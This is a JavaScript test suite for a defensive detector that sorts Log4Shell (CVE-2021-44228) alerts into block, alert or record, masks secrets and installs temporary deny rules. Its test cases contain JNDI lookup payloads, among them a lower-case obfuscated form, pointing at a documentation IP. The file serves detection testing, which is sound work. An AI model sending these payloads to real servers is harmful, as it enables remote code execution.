import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {spawnSync} from 'node:child_process';
import {decide} from '../xdr/known-cve/decide.mjs';
import {readAlerts,projectAlert} from '../xdr/known-cve/read-alerts.mjs';
import {respond} from '../xdr/known-cve/respond.mjs';
import {evaluateAccess} from '../ztna/evaluate.mjs';
import {checkAccess} from '../ztna/check.mjs';

const json=async file=>JSON.parse(await readFile(new URL('../'+file,import.meta.url),'utf8'));
const fixture=await json('xdr/fixtures/known-cve.json');
const report=await json('xdr/known-cve/result.json');
const now=new Date('2026-10-13T00:00:00.000Z');
const lookup='$'+'{jndi:ldap://192.0.2.9/example}';
const template=(query='',level=12,mitre=['T1190'])=>({
  id:'TEST-2026',timestamp:now.toISOString(),
  rule:{level,mitre,description:'원격 조회 구문 의심'},
  data:{srcip:'198.51.100.81',url:'/notes?q='+query}
});

test('original upstream Log4Shell training fixture stays complete and unmodified',()=>{
  assert.equal(fixture.schema,'aleph.xdr.fixture.v1');
  assert.equal(fixture.moduleKey,'known-cve');
  assert.equal(fixture.alerts.length,24);
  assert.equal(new Set(fixture.alerts.map(e=>e.id)).size,24);
  assert.ok(fixture.alerts.every(e=>e.agent.name==='choi-bujang-pc'));
});

test('read-alerts prints one masked summary for each alert and nothing else',async()=>{
  const rows=await readAlerts();
  assert.equal(rows.length,24);
  assert.ok(rows.every(x=>Object.keys(x).sort().join(',')==='account,description,level,source,time'));
  const command=spawnSync(process.execPath,['xdr/known-cve/read-alerts.mjs'],{encoding:'utf8'});
  assert.equal(command.status,0,command.stderr);
  assert.equal(command.stdout.trim().split('\n').length,24);
  const mocked=projectAlert({timestamp:'2026-10-13T00:00:00Z',
    data:{srcip:'192.0.2.4',srcuser:'Bearer privatevalue'},
    rule:{level:12,description:'password=privatepass token=privatetoken'}});
  assert.doesNotMatch(JSON.stringify(mocked),/privatevalue|privatepass|privatetoken/);
});

test('the official result contract matches every actual independent decision',()=>{
  assert.equal(report.schema,'aleph.xdr.result.v1');
  assert.equal(report.moduleKey,'known-cve');
  assert.equal(report.decisions.length,fixture.alerts.length);
  const counts={block:0,alert:0,record:0};
  fixture.alerts.forEach((event,index)=>{
    const decision=decide(event);
    assert.deepEqual(report.decisions[index],{alertId:event.id,...decision},event.id);
    assert.ok(Number.isFinite(decision.confidence)&&decision.confidence>=0&&decision.confidence<=1);
    assert.equal(decision.action,decision.confidence>=.85?'block':decision.confidence>=.5?'alert':'record');
    assert.ok(decision.reason && !/[\r\n]/.test(decision.reason));
    counts[decision.action]++;
  });
  assert.deepEqual(counts,{block:8,alert:8,record:8});
  assert.deepEqual(counts,report.counts);
});

test('original high-confidence, ambiguous and ordinary requests are separated correctly',()=>{
  fixture.alerts.forEach(event=>{
    const answer=decide(event);
    const tagged=event.rule.mitre.includes('T1190');
    const containsLookup=Object.values(event.data).some(value=>
      typeof value==='string'&&value.includes('jndi:ldap://'));
    if(containsLookup && tagged && event.rule.level>=10)
      assert.equal(answer.action,'block',event.id);
    else if(tagged)
      assert.equal(answer.action,'alert',event.id);
    else
      assert.equal(answer.action,'record',event.id);
  });
});

test('standalone decide file avoids imports, IO and dynamic execution',async()=>{
  const code=await readFile(new URL('../xdr/known-cve/decide.mjs',import.meta.url),'utf8');
  assert.doesNotMatch(code,/^\s*import(?:\s|[{*"'(])/m);
  assert.doesNotMatch(code,/\b(?:fetch|require|readFile|writeFile|eval)\s*\(/);
  assert.ok(code.includes('const PATTERNS'));
});

test('pattern evidence mentions both CVE-2021-44228 and MITRE T1190',async()=>{
  const items=await json('xdr/known-cve/patterns.json');
  const module=await readFile(new URL('../xdr/known-cve/decide.mjs',import.meta.url),'utf8');
  assert.ok(items.length>=3);
  for(const item of items){
    assert.ok(item.name && item.condition && item.evidence);
    assert.match(item.evidence,/T1190/);
    assert.doesNotMatch(item.evidence,/[\r\n]/);
    assert.ok(module.includes(item.name));
  }
});

test('15-minute file-backed ZTNA denials only cover unambiguous CVE attacks',async()=>{
  const denial=await json('xdr/temporary-deny.json');
  const lines=(await readFile(new URL('../xdr/alerts.log',import.meta.url),'utf8')).trim().split('\n').filter(Boolean);
  assert.equal(denial.length,8);
  assert.equal(lines.length,16);
  for(const line of lines){
    const item=JSON.parse(line);
    assert.ok(['block','alert'].includes(item.action));
    assert.ok(item.alertId&&item.at&&item.reason);
    assert.equal(Object.hasOwn(item,'useragent'),false);
  }
  for(const rule of denial){
    assert.equal(rule.action,'deny');
    assert.ok(rule.alertId && rule.source && rule.reason && rule.expiresAt);
    assert.equal((await evaluateAccess(rule.source,now)).action,'deny');
    assert.equal((await evaluateAccess(rule.source,now.getTime()+16*60000)).action,'allow');
  }
  for(const event of fixture.alerts){
    if(decide(event).action!=='block'){
      assert.equal((await evaluateAccess(event.data.srcip,now)).action,'allow',event.id);
    }
  }
  assert.equal(checkAccess('192.0.2.72',[],now.getTime()).action,'allow');
  assert.equal(checkAccess('192.0.2.72',[],now.getTime(),{deny:[{source:'192.0.2.72'}]}).action,'deny');
});

test('forged block decision cannot install a rule for a harmless request',async()=>{
  const ordinary=fixture.alerts.find(a=>a.id==='kc-18');
  const result=await respond(ordinary,{action:'block',confidence:.99,reason:'forged'}, {now,persist:false});
  assert.equal(result.rules.length,0);
  assert.equal(result.access.action,'allow');
});

for(const [name,event,expected] of [
  ['complete JNDI lookup in URL',template(encodeURIComponent(lookup)),'block'],
  ['JNDI lookup in request header',{...template('/'),data:{srcip:'198.51.100.81',headers:{'User-Agent':lookup}}},'block'],
  ['JNDI lower-case obfuscation',template(encodeURIComponent('$'+'{'+'$'+'{lower:j}ndi:ldap://192.0.2.9/a}')),'block'],
  ['complete lookup with no Wazuh corroboration',template(encodeURIComponent(lookup),3,[]),'alert'],
  ['complete lookup from invalid IP',{...template(encodeURIComponent(lookup)),data:{srcip:'999.999.999.999',url:'/?q='+encodeURIComponent(lookup)}},'alert'],
  ['CVE name in training article',template('CVE-2021-44228-lesson',6),'alert'],
  ['CVE repeated title search', {...template('CVE-2021-44228',12),data:{srcip:'198.51.100.81',url:'/?q=CVE-2021-44228',count:'38'}},'alert'],
  ['JNDI class topic',template('jndi-class',5),'alert'],
  ['scanner without payload',{...template('class-check',6),rule:{level:6,mitre:['T1190'],description:'취약점 점검 도구 흔적'}},'alert'],
  ['ordinary file access',template('note-01',3,[]),'record'],
  ['plain healthy endpoint', {...template('/health',2,[]),rule:{level:2,mitre:[],description:'상태 확인 주소가 열렸습니다.'}},'record'],
  ['unrelated note mentioning CVE at low level',template('CVE-2021-44228',3,[]),'record']
]){
  test(name,()=>assert.equal(decide(event).action,expected,JSON.stringify(decide(event))));
}
